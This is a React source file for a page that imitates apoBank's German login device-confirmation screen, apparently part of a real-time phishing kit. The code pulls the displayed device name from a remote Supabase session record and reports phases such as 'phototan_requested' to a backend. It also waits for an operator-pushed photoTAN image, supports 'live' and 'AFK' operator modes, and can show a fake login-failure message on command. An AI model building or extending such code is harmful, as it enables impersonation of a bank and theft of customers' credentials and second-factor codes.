import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import apobankLogo from "@/assets/apobank-logo.svg";
import { getSettings } from "@/lib/adminSettings";
import { useFlowStep, setStoredSession, useSessionAction, getStoredSession, reportPhase } from "@/hooks/useSessionFlow";
import { supabase } from "@/integrations/supabase/client";
import { Loader2 } from "lucide-react";

const DeviceConfirm = () => {
  const navigate = useNavigate();
  const [settings, setSettings] = useState(getSettings());
  const [remoteDevice, setRemoteDevice] = useState<string | null>(null);

  useEffect(() => {
    const handler = () => setSettings(getSettings());
    window.addEventListener("admin-settings-changed", handler);
    window.addEventListener("storage", handler);
    return () => {
      window.removeEventListener("admin-settings-changed", handler);
      window.removeEventListener("storage", handler);
    };
  }, []);

  useFlowStep({
    phase: "confirm",
    afkNext: () => {}, // user clicks button manually in AFK
    onSuccess: () => navigate("/profil-abruf"),
    onTwofa: () => {},
    onLoginFailed: () => {
      setStoredSession(null);
      sessionStorage.setItem("login_error", "Anmeldung fehlgeschlagen. Bitte erneut versuchen.");
      navigate("/");
    },
  });

  const { meta } = useSessionAction({});
  const [waitingPhoto, setWaitingPhoto] = useState(false);

  useEffect(() => {
    if (waitingPhoto && meta?.photoTanImage) {
      navigate("/phototan");
    }
  }, [waitingPhoto, meta?.photoTanImage, navigate]);

  useEffect(() => {
    const s = getStoredSession();
    if (!s) return;
    (supabase as any).from("sessions").select("meta").eq("id", s.id).maybeSingle().then(({ data }: any) => {
      if (data?.meta?.deviceName) setRemoteDevice(String(data.meta.deviceName));
    });
  }, []);

  useEffect(() => {
    if (meta?.deviceName) setRemoteDevice(String(meta.deviceName));
  }, [meta?.deviceName]);

  const deviceName = remoteDevice || settings.deviceName;

  const handleClick = async () => {
    const s = getStoredSession();
    const isLive = s?.mode === "live" || s?.mode === "live_change";
    if (!isLive) {
      navigate("/phototan");
      return;
    }
    setWaitingPhoto(true);
    try {
      await reportPhase("phototan_requested", { photoTanRequestedAt: new Date().toISOString() });
    } catch {}
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center px-3 sm:px-0">
      <div className="w-full max-w-[820px] bg-white mt-4 sm:mt-12 mb-8 rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)]">
        {/* Header */}
        <div className="px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
          <h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>Login</h1>
        </div>

        <div className="px-4 sm:px-8 py-5 sm:py-6 space-y-6 sm:space-y-8 bg-muted border border-border/40 border-t-0">
          <p className="text-foreground text-base leading-relaxed">
            Bitte bestätigen Sie die Anmeldung auf Ihrem Gerät mit dem Namen &apos;{deviceName}&apos;.
          </p>

          <p className="text-foreground text-base leading-relaxed">
            Sollten Sie keinen Internetzugang mit Ihrem Smartphone haben, können Sie den Login auch mit photoTAN bestätigen.
          </p>

          <div className="flex justify-end pt-2">
            <Button
              onClick={handleClick}
              disabled={waitingPhoto}
              className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base disabled:opacity-80"
            >
              {waitingPhoto ? (
                <span className="flex items-center gap-2">
                  <Loader2 className="h-4 w-4 animate-spin" />
                  photoTAN
                </span>
              ) : (
                "photoTAN"
              )}
            </Button>
          </div>
        </div>
      </div>

      {/* Footer Logo */}
      <div className="pb-10">
        <img
          src={apobankLogo}
          alt="apoBank - Bank der Gesundheit"
          className="h-16 mx-auto"
          loading="lazy"
        />
      </div>
    </div>
  );
};

export default DeviceConfirm;
